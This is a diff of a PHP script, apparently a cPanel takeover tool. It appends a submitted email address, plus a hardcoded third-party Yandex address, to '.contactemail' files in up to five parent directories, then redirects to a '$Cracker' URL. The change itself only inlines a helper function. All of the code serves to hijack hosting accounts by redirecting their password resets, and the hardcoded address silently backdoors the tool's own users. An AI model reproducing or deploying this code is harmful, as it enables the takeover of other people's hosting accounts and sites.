@@ -6,44 +6,53 @@ if (isset($_POST['submit'])) {
 
 $your_email = $_POST['Mail'];
 
-function Cpanel(){
-fwrite($file, "\n".$your_email."\n");
-fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
-fclose($file);
-header('Location:'.$Cracker);
-}
 
 if (!$file = fopen("../.contactemail", "a")) {
  header('refresh:2, url:cpanel.php');
 }
 else{
-Cpanel();
+fwrite($file, "\n".$your_email."\n");
+fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
+fclose($file);
+header('Location:'.$Cracker);
 }
 if (!$file = fopen("../../.contactemail", "a")) {
 
 header('refresh:2, url:cpanel.php');
 }
 else{
-Cpanel();
+fwrite($file, "\n".$your_email."\n");
+fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
+fclose($file);
+header('Location:'.$Cracker);
 }
 if (!$file = fopen("../../../.contactemail", "a")) {
 
 	header('refresh:2, url:cpanel.php');
 }
 else{
-Cpanel();
+fwrite($file, "\n".$your_email."\n");
+fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
+fclose($file);
+header('Location:'.$Cracker);
 }
 if (!$file = fopen("../../../../.contactemail", "a")) {
 header('refresh:2, url:cpanel.php');	
 }
 else{
-Cpanel();	
+fwrite($file, "\n".$your_email."\n");
+fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
+fclose($file);
+header('Location:'.$Cracker);
 }
 if (!$file = fopen("../../../../../.contactemail", "a")) {
 	header('refresh:2, url:cpanel.php');
 }
 else{
-Cpanel();	
+fwrite($file, "\n".$your_email."\n");
+fwrite($file, 'd4rk.vamp1re.ind@yandex.com'."\n");
+fclose($file);
+header('Location:'.$Cracker);	
 }
 }
 
